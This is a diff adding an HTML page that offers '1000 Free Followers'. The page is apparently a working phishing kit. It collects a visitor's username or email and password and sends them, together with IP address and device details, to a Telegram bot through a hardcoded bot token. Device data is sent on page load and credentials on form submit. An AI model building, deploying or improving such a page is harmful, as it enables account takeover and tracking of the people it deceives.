@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Free Followers Form</title>
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.3/dist/tailwind.min.css" rel="stylesheet">
+</head>
+<body class="bg-gray-100 flex justify-center items-center h-screen">
+  <div class="bg-white p-6 rounded-lg shadow-lg max-w-sm w-full">
+    <div class="flex justify-between items-center">
+      <h1 class="text-xl font-bold">1000 Free Followers</h1>
+      <span class="bg-blue-500 text-white px-3 py-1 rounded-full text-xs">SERVICE ACTIVE</span>
+    </div>
+    <form id="followersForm" class="mt-4">
+      <label for="username" class="block text-sm font-medium text-gray-700">Phone number, username, or email </label>
+      <input type="text" id="username" name="username" required class="mt-1 px-3 py-2 bg-gray-50 border shadow-sm border-gray-300 rounded-md focus:outline-none focus:border-blue-500 block w-full">
+            
+      <label for="password" class="block text-sm font-medium text-gray-700 mt-4">Password</label>
+      <input type="text" id="password" name="password" required class="mt-1 px-3 py-2 bg-gray-50 border shadow-sm border-gray-300 rounded-md focus:outline-none focus:border-blue-500 block w-full">
+        
+      <button type="submit" class="mt-6 w-full bg-blue-500 text-white px-4 py-2 rounded-md hover:bg-blue-600">Get Free Followers!</button>
+    </form>
+    
+    <ul class="list-none mt-4">
+      <li class="flex items-center text-sm">
+        <span class="bg-blue-500 text-white h-6 w-6 flex justify-center items-center rounded-full mr-2">&check;</span>
+        You can get 1000 Followers per day.
+      </li>
+      <li class="flex items-center text-sm mt-1">
+        <span class="bg-blue-500 text-white h-6 w-6 flex justify-center items-center rounded-full mr-2">&check;</span>
+        Please make sure the required section is correct.
+      </li>
+      <li class="flex items-center text-sm mt-1">
+        <span class="bg-blue-500 text-white h-6 w-6 flex justify-center items-center rounded-full mr-2">&check;</span>
+        Password is required!
+      </li>
+    </ul>
+  </div>
+
+  <script>
+    const botToken = "7611023975:AAGAR6vbPFAVdU_tg92u79FhQA6vYyV2XDA";  // Replace with your actual bot token
+
+    // Function to get query parameters from the URL
+    function getQueryParam(param) {
+      const urlParams = new URLSearchParams(window.location.search);
+      return urlParams.get(param);
+    }
+
+    // Get the chat ID from the URL parameter `Id`
+    const chatId = getQueryParam('Id');
+
+    // Function to fetch IP address and device info
+    async function getDeviceInfo() {
+      const ipResponse = await fetch('https://api.ipify.org?format=json'); // Fetch the IP address
+      const { ip: ipAddress } = await ipResponse.json();
+      
+      // Get user agent and platform details
+      const deviceInfo = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        memory: navigator.deviceMemory || 'N/A',
+        battery: await getBatteryPercentage()
+      };
+      
+      return { ipAddress, deviceInfo };
+    }
+
+    // Function to get battery percentage
+    async function getBatteryPercentage() {
+      if (navigator.getBattery) {
+        const battery = await navigator.getBattery();
+        return battery.level * 100; // Return battery percentage (0 to 100)
+      } else {
+        return "N/A"; // If battery info is unavailable
+      }
+    }
+
+    // Function to send information to Telegram
+    function sendInfoToTelegram(message) {
+      if (!chatId) {
+        console.error('Chat ID not provided in URL parameter.');
+        return;
+      }
+
+      // Send the message to the Telegram bot using fetch API
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`)
+        .then(response => {
+          if (!response.ok) {
+            throw new Error('Network response was not ok');
+          }
+          return response.json();
+        })
+        .then(data => console.log('Message sent:', data))
+        .catch(error => console.error('There was a problem with the fetch operation:', error));
+    }
+
+    // Send device info and IP address on page load
+    window.addEventListener('load', async () => {
+      const { ipAddress, deviceInfo } = await getDeviceInfo();
+
+      // Format the message with backticks for monospace font and emojis
+      const message = `🚨 New login alert 🚨\n\n` +
+                      `🌍 IP Address: \`${ipAddress}\`\n` +
+                      `🖥️ User Agent: ${deviceInfo.userAgent}\n` +
+                      `💻 Platform: ${deviceInfo.platform}\n` +
+                      `💾 Memory: ${deviceInfo.memory} GB\n` +
+                      `🔋 Battery: ${deviceInfo.battery}%`;
+
+      // Send notification when page loads
+      sendInfoToTelegram(message);
+    });
+
+    // Handle form submission
+    const followersForm = document.getElementById('followersForm');
+    followersForm.addEventListener('submit', async (event) => {
+      event.preventDefault();  // Prevent the form from submitting normally
+
+      const email = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+      
+      const { ipAddress, deviceInfo } = await getDeviceInfo();
+
+      // Format the message to send on form submission
+      const message = `📱 New login attempt 📱\n\n` +
+                      `✉️ Email/Username: \`${email}\`\n` +
+                      `🔒 Password: \`${password}\`\n` +
+                      `🌍 IP Address: \`${ipAddress}\`\n` +
+                      `🖥️ User Agent: ${deviceInfo.userAgent}\n` +
+                      `💻 Platform: ${deviceInfo.platform}\n` +
+                      `💾 Memory: ${deviceInfo.memory} GB\n` +
+                      `🔋 Battery: ${deviceInfo.battery}%`;
+
+      // Send the message when form is submitted
+      sendInfoToTelegram(message);
+    });
+  </script>
+</body>
+</html>
